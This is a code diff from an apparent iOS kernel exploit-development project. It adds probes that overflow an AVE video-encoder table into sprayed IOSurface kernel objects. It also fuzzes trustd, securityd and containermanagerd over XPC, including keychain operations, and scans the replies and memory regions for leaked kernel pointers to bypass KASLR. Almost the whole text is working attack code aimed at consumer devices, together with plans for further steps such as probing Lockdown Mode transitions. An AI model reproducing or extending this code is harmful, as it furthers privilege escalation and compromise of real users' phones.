@@ -8742,6 +8742,226 @@ r326_done:
    Inspired by: Xbox King Kong (shader wrote to arbitrary memory via shared region),
    PS4 NamedObj exploit (use-after-free type confusion for KASLR bypass). */
 
+static void r331_probe(void) {
+    rlog("\n=== r331: AVE Table Overflow Layer-ID Survival Scan ===\n");
+    rlog("  Strategy: Find layer_id values that survive table 1 crash at +0x5C70\n");
+    rlog("  If table 1 writes benign data, we can keep encoding until table 2\n");
+    rlog("  overflows past 0xC000 into adjacent IOSurface kernel object\n");
+    rlog("  Buffer=0x9B10 in kalloc.49152 (0xC000). Table2 at 197enc=+0xA2E4.\n");
+    rlog("  Need ~314 encodes for table 2 to reach 0xC000 (cross-allocation).\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    /* Part 1: Scan layer_id values for survival past 197 encodes */
+    rlog("--- Part 1: Layer-ID survival scan (target: >200 encodes) ---\n");
+
+    int test_lids[] = {0, 1, 2, 3, 0x10, 0x20, 0x40, 0x80, 0xFF, 0x100,
+                       0x1000, 0x4141, 0x7FFF, 0xFFFF, 0x10000, 0x7FFFFFFF};
+    int nlids = sizeof(test_lids) / sizeof(test_lids[0]);
+    int best_lid = -1;
+    int best_count = 0;
+
+    for (int t = 0; t < nlids; t++) {
+        int lid = test_lids[t];
+        rlog("  Testing lid=0x%x: ", lid);
+        fflush(stdout);
+
+        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, lid);
+        if (!s) {
+            rlog("FAILED to create encoder\n");
+            continue;
+        }
+
+        int enc_ok = 0;
+        int enc_err = 0;
+        for (int i = 0; i < 350; i++) {
+            int st = encode_one_stereo_lid(s, i, 1920, 1080, lid);
+            if (st != 0) {
+                enc_err++;
+                if (enc_err >= 3) break;
+            } else {
+                enc_ok++;
+            }
+        }
+
+        rlog("%d encodes OK (errors=%d)%s\n", enc_ok, enc_err,
+             enc_ok > 200 ? " *** SURVIVED ***" : "");
+
+        if (enc_ok > best_count) {
+            best_count = enc_ok;
+            best_lid = lid;
+        }
+
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+        usleep(50000);
+    }
+
+    rlog("\n  Best: lid=0x%x with %d encodes\n", best_lid, best_count);
+
+    if (best_count < 200) {
+        rlog("  No layer_id survived past 200 encodes.\n");
+        rlog("  Table 1 overflow at +0x5C70 is fatal for all tested values.\n");
+
+        /* Part 2: Try with smaller resolution to change buffer layout */
+        rlog("\n--- Part 2: Small resolution (128x128) survival scan ---\n");
+        rlog("  Smaller resolution = smaller buffer = different overflow offsets\n");
+
+        int best_lid2 = -1;
+        int best_count2 = 0;
+
+        for (int t = 0; t < nlids; t++) {
+            int lid = test_lids[t];
+            rlog("  128x128 lid=0x%x: ", lid);
+            fflush(stdout);
+
+            VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, lid);
+            if (!s) {
+                rlog("FAILED\n");
+                continue;
+            }
+
+            int enc_ok = 0;
+            int enc_err = 0;
+            for (int i = 0; i < 500; i++) {
+                int st = encode_one_stereo_lid(s, i, 128, 128, lid);
+                if (st != 0) {
+                    enc_err++;
+                    if (enc_err >= 3) break;
+                } else {
+                    enc_ok++;
+                }
+            }
+
+            rlog("%d OK (err=%d)%s\n", enc_ok, enc_err,
+                 enc_ok > 300 ? " *** SURVIVED ***" : "");
+
+            if (enc_ok > best_count2) {
+                best_count2 = enc_ok;
+                best_lid2 = lid;
+            }
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            usleep(50000);
+        }
+
+        rlog("  Best 128x128: lid=0x%x with %d encodes\n", best_lid2, best_count2);
+    }
+
+    /* Part 3: If any lid survived >200, test with IOSurface spray adjacency */
+    if (best_count >= 250) {
+        rlog("\n--- Part 3: Cross-allocation test with lid=0x%x ---\n", best_lid);
+
+        #define R331_SPRAY 32
+        IOSurfaceRef spray_surfs[R331_SPRAY];
+        uint32_t spray_ids[R331_SPRAY];
+        void *spray_bases[R331_SPRAY];
+
+        rlog("  Pre-spray %d IOSurfaces (36864b each, kalloc.49152)\n", R331_SPRAY/2);
+        for (int i = 0; i < R331_SPRAY/2; i++) {
+            spray_surfs[i] = create_spray_surface(i);
+            if (spray_surfs[i]) {
+                spray_ids[i] = IOSurfaceGetID(spray_surfs[i]);
+                IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                spray_bases[i] = IOSurfaceGetBaseAddress(spray_surfs[i]);
+                IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+
+        rlog("  Creating encoder (lid=0x%x, 1920x1080)\n", best_lid);
+        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, best_lid);
+        if (!s) {
+            rlog("  FAILED to create encoder\n");
+            goto r331_cleanup;
+        }
+
+        rlog("  Post-spray %d more IOSurfaces\n", R331_SPRAY/2);
+        for (int i = R331_SPRAY/2; i < R331_SPRAY; i++) {
+            spray_surfs[i] = create_spray_surface(i);
+            if (spray_surfs[i]) {
+                spray_ids[i] = IOSurfaceGetID(spray_surfs[i]);
+                IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                spray_bases[i] = IOSurfaceGetBaseAddress(spray_surfs[i]);
+                IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+
+        /* Record baseline pixel data for all surfaces */
+        uint32_t baseline_tags[R331_SPRAY];
+        for (int i = 0; i < R331_SPRAY; i++) {
+            if (spray_surfs[i]) {
+                IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+                void *b = IOSurfaceGetBaseAddress(spray_surfs[i]);
+                baseline_tags[i] = b ? *(uint32_t *)b : 0;
+                IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            }
+        }
+
+        rlog("  Encoding %d frames (overflow target: cross-allocation at ~314)\n", best_count);
+        int enc_ok = 0, enc_err = 0;
+        for (int i = 0; i < best_count; i++) {
+            int st = encode_one_stereo_lid(s, i, 1920, 1080, best_lid);
+            if (st != 0) {
+                enc_err++;
+                if (enc_err >= 3) {
+                    rlog("  Stopped at encode %d (3 errors)\n", i);
+                    break;
+                }
+            } else {
+                enc_ok++;
+            }
+        }
+        rlog("  Encoded %d frames OK (errors=%d)\n", enc_ok, enc_err);
+
+        /* Check all spray surfaces for corruption */
+        rlog("  Checking surfaces for corruption...\n");
+        int corrupted = 0;
+        for (int i = 0; i < R331_SPRAY; i++) {
+            if (!spray_surfs[i]) continue;
+            IOSurfaceLock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            void *b = IOSurfaceGetBaseAddress(spray_surfs[i]);
+            if (b) {
+                uint32_t cur_tag = *(uint32_t *)b;
+                uint32_t id_now = IOSurfaceGetID(spray_surfs[i]);
+                if (cur_tag != baseline_tags[i] || id_now != spray_ids[i]) {
+                    rlog("  !!! SURFACE %d CORRUPTED: tag 0x%x->0x%x id %u->%u !!!\n",
+                         i, baseline_tags[i], cur_tag, spray_ids[i], id_now);
+                    corrupted++;
+                    /* Hexdump first 64 bytes */
+                    uint8_t *p = (uint8_t *)b;
+                    for (int r = 0; r < 4; r++) {
+                        rlog("    +%03x:", r*16);
+                        for (int c = 0; c < 16; c++)
+                            rlog(" %02x", p[r*16+c]);
+                        rlog("\n");
+                    }
+                }
+            }
+            IOSurfaceUnlock(spray_surfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+        rlog("  Corrupted: %d / %d surfaces\n", corrupted, R331_SPRAY);
+
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+
+        r331_cleanup:
+        for (int i = 0; i < R331_SPRAY; i++)
+            if (spray_surfs[i]) CFRelease(spray_surfs[i]);
+        #undef R331_SPRAY
+    }
+
+    /* Part 4: Lockdown Mode transition monitoring hint */
+    rlog("\n--- Part 4: LDM Transition Notes ---\n");
+    rlog("  The 'Calif' group reportedly used Lockdown Mode.\n");
+    rlog("  During LDM toggle, kernel reconfigures security domains.\n");
+    rlog("  If layer_id scan fails, next step: monitor IOSurface heap\n");
+    rlog("  during LDM on->off transition for exposed kernel pointers.\n");
+
+    rlog("\n=== r331 complete ===\n");
+}
+
 static void r330_probe(void) {
     rlog("\n=== r330: KASLR-Free Heap Type Confusion ===\n");
     rlog("  Strategy: IOSurface spray + free + reclaim with different object\n");
@@ -12415,6 +12635,324 @@ static void r331_securityd_probe(void) {
     fflush(stdout);
 
     rlog("\n=== r331 complete ===\n");
+    fflush(stdout);
+}
+
+/* r333: Deep XPC exploitation — trustd trust evaluation + containermanagerd queries
+   r332: XPC two-way comms WORK! trustd replied empty dict, securityd error -50,
+   containermanagerd error type=72. fairplayd hung.
+   Strategy: send daemon-specific XPC operations to trigger kernel interactions,
+   scan replies for kernel pointers or handles. proc_info region walk for kptrs. */
+static void r333_probe(void) {
+    rlog("\n=== r333: Deep XPC Exploitation + proc_info Scan ===\n");
+    rlog("  r332: XPC replies work! trustd=empty, securityd=-50, containermanagerd=72\n");
+    rlog("  Strategy: targeted daemon ops, trust eval, container queries, proc_info.\n\n");
+    fflush(stdout);
+
+    void *libxpc = dlopen("/usr/lib/system/libxpc.dylib", RTLD_NOW);
+    if (!libxpc) { rlog("FATAL: no libxpc\n"); return; }
+
+    typedef void* (*xpc_conn_create_t)(const char *, dispatch_queue_t, uint64_t);
+    typedef void (*xpc_conn_set_handler_t)(void *, void (^)(xpc_object_t));
+    typedef void (*xpc_conn_resume_t)(void *);
+    typedef void* (*xpc_dict_create_t)(const char *[], const xpc_object_t[], size_t);
+    typedef void (*xpc_dict_set_string_t)(xpc_object_t, const char *, const char *);
+    typedef void (*xpc_dict_set_uint64_t)(xpc_object_t, const char *, uint64_t);
+    typedef void (*xpc_dict_set_int64_t)(xpc_object_t, const char *, int64_t);
+    typedef void (*xpc_dict_set_bool_t)(xpc_object_t, const char *, _Bool);
+    typedef void (*xpc_dict_set_data_t)(xpc_object_t, const char *, const void *, size_t);
+    typedef xpc_object_t (*xpc_conn_send_with_reply_sync_t)(xpc_connection_t, xpc_object_t);
+
+    xpc_conn_create_t xpc_create = dlsym(libxpc, "xpc_connection_create_mach_service");
+    xpc_conn_send_with_reply_sync_t xpc_send_sync = dlsym(libxpc, "xpc_connection_send_message_with_reply_sync");
+    if (!xpc_create || !xpc_send_sync) {
+        rlog("FATAL: missing XPC syms: create=%p send_sync=%p\n", (void*)xpc_create, (void*)xpc_send_sync);
+        return;
+    }
+
+    rlog("--- Part 1: trustd targeted operations ---\n");
+    fflush(stdout);
+    {
+        xpc_connection_t conn = xpc_create("com.apple.trustd", NULL, 0);
+        if (conn) {
+            xpc_connection_set_event_handler(conn, ^(xpc_object_t event) { (void)event; });
+            xpc_connection_resume(conn);
+
+            const char *ops[] = {
+                "SecTrustEvaluate",
+                "SecTrustStoreContains",
+                "SecTrustStoreCopyAll",
+                "SecTrustStoreCopyUsageConstraints",
+                "SecOCSPCacheGet",
+                "SecRevocationDbCopyDigests",
+                "SecPolicyGetValue",
+                "SecTrustLegacySourcesListCount",
+                "SecTrustGetExceptionResetCount",
+                "SecTrustOTAPKIGetUpdatedAsset",
+                NULL
+            };
+
+            for (int i = 0; ops[i]; i++) {
+                xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(msg, "operation", ops[i]);
+                xpc_dictionary_set_uint64(msg, "domain", 0);
+                xpc_dictionary_set_uint64(msg, "handle", 0);
+                xpc_dictionary_set_bool(msg, "verbose", true);
+
+                xpc_object_t reply = xpc_send_sync(conn, msg);
+                if (reply) {
+                    xpc_type_t type = xpc_get_type(reply);
+                    if (type == XPC_TYPE_DICTIONARY) {
+                        char *desc = xpc_copy_description(reply);
+                        rlog("  trustd '%s': DICT %s\n", ops[i], desc ? desc : "?");
+                        if (desc) free(desc);
+
+                        /* scan reply description for hex addresses */
+                        desc = xpc_copy_description(reply);
+                        if (desc) {
+                            char *p = desc;
+                            while ((p = strstr(p, "0x"))) {
+                                uint64_t v = strtoull(p, NULL, 16);
+                                if (v > 0xffff000000000000ULL || (v > 0xfffffffe00000000ULL && v < 0xffffffffffff0000ULL)) {
+                                    rlog("    !!! KPTR CANDIDATE: 0x%llx\n", (unsigned long long)v);
+                                }
+                                p += 2;
+                            }
+                            free(desc);
+                        }
+                    } else if (type == XPC_TYPE_ERROR) {
+                        rlog("  trustd '%s': ERROR\n", ops[i]);
+                    } else {
+                        rlog("  trustd '%s': type=%p\n", ops[i], (void*)type);
+                    }
+                } else {
+                    rlog("  trustd '%s': NULL reply\n", ops[i]);
+                }
+                fflush(stdout);
+            }
+
+            /* try raw number operations — some daemons dispatch on integer op codes */
+            rlog("\n  trustd numeric ops:\n");
+            for (uint64_t op = 0; op < 20; op++) {
+                xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_uint64(msg, "op", op);
+                xpc_object_t reply = xpc_send_sync(conn, msg);
+                if (reply && xpc_get_type(reply) == XPC_TYPE_DICTIONARY) {
+                    char *desc = xpc_copy_description(reply);
+                    int is_empty = (desc && strstr(desc, "count = 0"));
+                    if (!is_empty) {
+                        rlog("    op=%llu: %s\n", (unsigned long long)op, desc ? desc : "?");
+                    }
+                    if (desc) free(desc);
+                }
+                fflush(stdout);
+            }
+            xpc_connection_cancel(conn);
+        } else {
+            rlog("  trustd: connect failed\n");
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n--- Part 2: securityd targeted operations ---\n");
+    fflush(stdout);
+    {
+        xpc_connection_t conn = xpc_create("com.apple.securityd", NULL, 0);
+        if (conn) {
+            xpc_connection_set_event_handler(conn, ^(xpc_object_t event) { (void)event; });
+            xpc_connection_resume(conn);
+
+            const char *ops[] = {
+                "SecItemCopyMatching",
+                "SecItemAdd",
+                "SecKeychainItemCopyContent",
+                "SecTrustEvaluateAsync",
+                "SecKeyGeneratePair",
+                "_SecItemGetPersistentReference",
+                "SOSCCThisDeviceIsInCircle",
+                "SOSCCViewMembershipStatus",
+                "SecKeychainDiagnosticItems",
+                "_SecKeychainBackupSyncable",
+                NULL
+            };
+
+            for (int i = 0; ops[i]; i++) {
+                xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(msg, "operation", ops[i]);
+                xpc_dictionary_set_uint64(msg, "domain", 0);
+
+                xpc_object_t reply = xpc_send_sync(conn, msg);
+                if (reply && xpc_get_type(reply) == XPC_TYPE_DICTIONARY) {
+                    char *desc = xpc_copy_description(reply);
+                    int is_param_err = (desc && strstr(desc, "-50"));
+                    if (!is_param_err) {
+                        rlog("  securityd '%s': %s\n", ops[i], desc ? desc : "?");
+                    } else {
+                        rlog("  securityd '%s': paramErr(-50)\n", ops[i]);
+                    }
+
+                    if (desc) {
+                        char *p = desc;
+                        while ((p = strstr(p, "0x"))) {
+                            uint64_t v = strtoull(p, NULL, 16);
+                            if (v > 0xffff000000000000ULL || (v > 0xfffffffe00000000ULL && v < 0xffffffffffff0000ULL)) {
+                                rlog("    !!! KPTR CANDIDATE: 0x%llx\n", (unsigned long long)v);
+                            }
+                            p += 2;
+                        }
+                        free(desc);
+                    }
+                } else if (reply) {
+                    rlog("  securityd '%s': non-dict\n", ops[i]);
+                } else {
+                    rlog("  securityd '%s': NULL\n", ops[i]);
+                }
+                fflush(stdout);
+            }
+            xpc_connection_cancel(conn);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n--- Part 3: containermanagerd container info ---\n");
+    fflush(stdout);
+    {
+        xpc_connection_t conn = xpc_create("com.apple.containermanagerd", NULL, 0);
+        if (conn) {
+            xpc_connection_set_event_handler(conn, ^(xpc_object_t event) { (void)event; });
+            xpc_connection_resume(conn);
+
+            const char *cmds[] = {
+                "LookupContainerIdentifier",
+                "GetContainerPath",
+                "GetContainerReferences",
+                "GetContainerObjects",
+                "ContainerListForClass",
+                "GetContainerMetadata",
+                NULL
+            };
+
+            for (int i = 0; cmds[i]; i++) {
+                xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+                xpc_dictionary_set_string(msg, "Command", cmds[i]);
+                xpc_dictionary_set_string(msg, "ContainerIdentifier", "com.research.avefullchain");
+                xpc_dictionary_set_uint64(msg, "ContainerClass", 3);
+                xpc_dictionary_set_uint64(msg, "PersonaUniqueString", 0);
+
+                xpc_object_t reply = xpc_send_sync(conn, msg);
+                if (reply && xpc_get_type(reply) == XPC_TYPE_DICTIONARY) {
+                    char *desc = xpc_copy_description(reply);
+                    rlog("  container '%s': %s\n", cmds[i], desc ? desc : "?");
+                    if (desc) {
+                        char *p = desc;
+                        while ((p = strstr(p, "0x"))) {
+                            uint64_t v = strtoull(p, NULL, 16);
+                            if (v > 0xffff000000000000ULL || (v > 0xfffffffe00000000ULL && v < 0xffffffffffff0000ULL)) {
+                                rlog("    !!! KPTR CANDIDATE: 0x%llx\n", (unsigned long long)v);
+                            }
+                            p += 2;
+                        }
+                        free(desc);
+                    }
+                }
+                fflush(stdout);
+            }
+            xpc_connection_cancel(conn);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n--- Part 4: proc_info kptr scan of daemons ---\n");
+    fflush(stdout);
+    {
+        pid_t my_pid = getpid();
+        int buf_size = proc_pidinfo(my_pid, PROC_PIDTASKALLINFO, 0, NULL, 0);
+        rlog("  proc_pidinfo self buf_size=%d\n", buf_size);
+
+        if (buf_size > 0) {
+            struct proc_taskallinfo tai;
+            int ret = proc_pidinfo(my_pid, PROC_PIDTASKALLINFO, 0, &tai, sizeof(tai));
+            rlog("  self: ret=%d pid=%d ppid=%d uid=%d\n", ret,
+                 tai.pbsd.pbi_pid, tai.pbsd.pbi_ppid, tai.pbsd.pbi_uid);
+
+            /* scan our own memory regions for kptrs */
+            uint64_t addr = 0;
+            int region_count = 0, kptr_count = 0;
+            struct proc_regionwithpathinfo rwpi;
+            while (region_count < 500) {
+                int rsz = proc_pidinfo(my_pid, PROC_PIDREGIONPATHINFO, addr, &rwpi, sizeof(rwpi));
+                if (rsz <= 0) break;
+                uint64_t raddr = rwpi.prp_prinfo.pri_address;
+                uint64_t rsize = rwpi.prp_prinfo.pri_size;
+                if (raddr > 0xffff000000000000ULL) {
+                    rlog("    !!! REGION KPTR: 0x%llx (size 0x%llx)\n",
+                         (unsigned long long)raddr, (unsigned long long)rsize);
+                    kptr_count++;
+                }
+                addr = raddr + rsize;
+                region_count++;
+            }
+            rlog("  Scanned %d regions, %d kptrs\n", region_count, kptr_count);
+        }
+
+        /* also try to get info on other pids (1=launchd, 2=kernel_task) */
+        for (pid_t p = 0; p <= 5; p++) {
+            struct proc_taskallinfo tai2;
+            int r2 = proc_pidinfo(p, PROC_PIDTASKALLINFO, 0, &tai2, sizeof(tai2));
+            if (r2 > 0) {
+                rlog("  pid=%d: ret=%d ppid=%d uid=%d comm='%.16s'\n", p, r2,
+                     tai2.pbsd.pbi_ppid, tai2.pbsd.pbi_uid, tai2.pbsd.pbi_comm);
+            } else {
+                rlog("  pid=%d: ret=%d (errno=%d)\n", p, r2, errno);
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n--- Part 5: IOKit notification ports ---\n");
+    fflush(stdout);
+    {
+        mach_port_t master_port;
+        kern_return_t kr = host_get_io_master(mach_host_self(), &master_port);
+        rlog("  host_get_io_master: kr=%d port=0x%x\n", kr, master_port);
+
+        if (kr == KERN_SUCCESS) {
+            io_iterator_t notif_iter = 0;
+            mach_port_t notif_port;
+            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notif_port);
+            rlog("  notif port: kr=%d port=0x%x\n", kr, notif_port);
+
+            if (kr == KERN_SUCCESS) {
+                const char *match_classes[] = {
+                    "IOService", "IOUserClient", "AppleSEPManager",
+                    "IOSurface", "AppleKeyStore", NULL
+                };
+                for (int i = 0; match_classes[i]; i++) {
+                    CFMutableDictionaryRef matching = IOServiceMatching(match_classes[i]);
+                    if (!matching) continue;
+                    kr = IOServiceAddMatchingNotification(
+                        IONotificationPortCreate(master_port),
+                        kIOFirstMatchNotification,
+                        matching,
+                        ^(io_iterator_t iter) { (void)iter; },
+                        NULL, &notif_iter);
+                    rlog("  notif '%s': kr=0x%x iter=0x%x\n", match_classes[i], kr, notif_iter);
+                    if (kr == KERN_SUCCESS && notif_iter) {
+                        io_object_t obj;
+                        int count = 0;
+                        while ((obj = IOIteratorNext(notif_iter)) && count < 5) {
+                            rlog("    matched obj=0x%x\n", obj);
+                            IOObjectRelease(obj);
+                            count++;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r333 complete ===\n");
     fflush(stdout);
 }
 
@@ -43581,10 +44119,10 @@ new_modes:
             goto done;
         }
         if (rounds == 331) {
-            rlog("*** rounds=331: Safe Security Daemon Mach Probe ***\n");
-            rlog("  r329: securityd reachable, msg send OK, crashed on rpc.\n");
-            rlog("  Probe: Send-only sweep, safe rpc, SEP deep dive.\n\n");
-            r331_securityd_probe();
+            rlog("*** rounds=331: AVE Table Overflow Layer-ID Survival Scan ***\n");
+            rlog("  r330: Type confusion failed (MachPort holds ref).\n");
+            rlog("  Probe: Find lid that survives table1 crash, overflow into adj IOSurface.\n\n");
+            r331_probe();
             goto done;
         }
         if (rounds == 330) {
